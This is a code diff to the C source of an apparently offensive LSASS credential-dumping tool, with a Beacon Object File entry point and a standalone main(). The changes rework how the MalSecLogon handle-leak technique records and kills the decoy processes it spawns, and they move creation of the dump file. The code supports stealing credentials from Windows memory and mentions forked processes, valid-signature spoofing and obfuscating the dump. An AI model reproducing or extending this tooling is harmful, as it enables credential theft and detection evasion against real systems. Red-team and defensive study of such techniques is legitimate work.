@@ -672,16 +672,28 @@ void go(char* args, int length)
      */
     BOOL use_seclogon_remotely = use_seclogon && dup;
     BOOL use_seclogon_locally = use_seclogon && !dup;
+    PPROCESS_LIST created_processes = NULL;
     if (use_seclogon)
     {
+        // if MalSecLogon is used to create other processes, save their PID
+        if (use_seclogon_remotely)
+        {
+            created_processes = intAlloc(sizeof(PROCESS_LIST));
+            if (!created_processes)
+            {
+                malloc_failed();
+                return;
+            }
+        }
         // leak an LSASS handle using MalSecLogon
         success = seclogon_stage_1(
             binary_path,
             dump_name,
             fork,
             use_valid_sig,
-            dup,
-            pid
+            use_seclogon_locally,
+            pid,
+            created_processes
         );
         if (use_seclogon_locally)
         {
@@ -694,6 +706,10 @@ void go(char* args, int length)
                 CALLBACK_ERROR,
                 "MalSecLogon technique failed!\n"
             );
+            if (created_processes)
+            {
+                intFree(created_processes); created_processes = NULL;
+            }
             return;
         }
         if (use_seclogon_locally)
@@ -716,7 +732,6 @@ void go(char* args, int length)
         permissions = PROCESS_QUERY_INFORMATION|PROCESS_CREATE_PROCESS;
     }
 
-    DWORD duplicated_pid = 0;
     HANDLE hProcess = obtain_lsass_handle(
         pid,
         permissions,
@@ -724,8 +739,7 @@ void go(char* args, int length)
         fork,
         use_seclogon,
         FALSE,
-        dump_name,
-        &duplicated_pid
+        dump_name
     );
 
     // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
@@ -771,11 +785,15 @@ void go(char* args, int length)
     // close the handle
     NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
 
-    // if we used MalSecLogon with a decoy binary, kill the process
+    // if we used MalSecLogon remotely, kill the created processes
     // you might want to change this...
     if (use_seclogon_remotely)
     {
-        kill_process(duplicated_pid);
+        for (DWORD i = 0; i < created_processes->Count; i++)
+        {
+            kill_process(created_processes->ProcessId[i]);
+        }
+        intFree(created_processes); created_processes = NULL;
     }
 
     // at this point, you can encrypt or obfuscate the dump
@@ -1001,10 +1019,6 @@ int main(int argc, char* argv[])
     if (!binary_path)
         binary_path = argv[0];
 
-    success = create_file(dump_name);
-    if (!success)
-        return -1;
-
     // set the signature
     if (use_valid_sig)
     {
@@ -1029,25 +1043,48 @@ int main(int argc, char* argv[])
     BOOL use_seclogon_remotely = use_seclogon && dup;
     BOOL use_seclogon_locally = use_seclogon && !dup;
     BOOL is_seclogon_stage_1 = use_seclogon && !is_seclogon_stage_2;
+    PPROCESS_LIST created_processes = NULL;
+
+    if (!is_seclogon_stage_2)
+    {
+        if (!create_file(dump_name))
+            return -1;
+    }
+
     if (is_seclogon_stage_1)
     {
         printf(
             "[!] MalLogonSec implementation is unstable, errors are to be expected\n"
         );
+        // if MalSecLogon is used to create other processes, save their PID
+        if (use_seclogon_remotely)
+        {
+            created_processes = intAlloc(sizeof(PROCESS_LIST));
+            if (!created_processes)
+            {
+                malloc_failed();
+                return -1;
+            }
+        }
         // leak an LSASS handle using MalSecLogon
         success = seclogon_stage_1(
             binary_path,
             dump_name,
             fork,
             use_valid_sig,
-            dup,
-            pid
+            use_seclogon_locally,
+            pid,
+            created_processes
         );
         if (!success)
         {
             printf(
                 "MalSecLogon technique failed!\n"
             );
+            if (created_processes)
+            {
+                intFree(created_processes); created_processes = NULL;
+            }
             return -1;
         }
         if (use_seclogon_locally)
@@ -1069,7 +1106,6 @@ int main(int argc, char* argv[])
         permissions = PROCESS_QUERY_INFORMATION|PROCESS_CREATE_PROCESS;
     }
 
-    DWORD duplicated_pid = 0;
     HANDLE hProcess = obtain_lsass_handle(
         pid,
         permissions,
@@ -1077,8 +1113,7 @@ int main(int argc, char* argv[])
         fork,
         use_seclogon,
         is_seclogon_stage_2,
-        dump_name,
-        &duplicated_pid
+        dump_name
     );
 
     // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
@@ -1124,11 +1159,15 @@ int main(int argc, char* argv[])
     // close the handle
     NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
 
-    // if we used MalSecLogon with a decoy binary, kill the process
+    // if we used MalSecLogon remotely, kill the created processes
     // you might want to change this...
     if (use_seclogon_remotely)
     {
-        kill_process(duplicated_pid);
+        for (DWORD i = 0; i < created_processes->Count; i++)
+        {
+            kill_process(created_processes->ProcessId[i]);
+        }
+        intFree(created_processes); created_processes = NULL;
     }
 
     // at this point, you can encrypt or obfuscate the dump
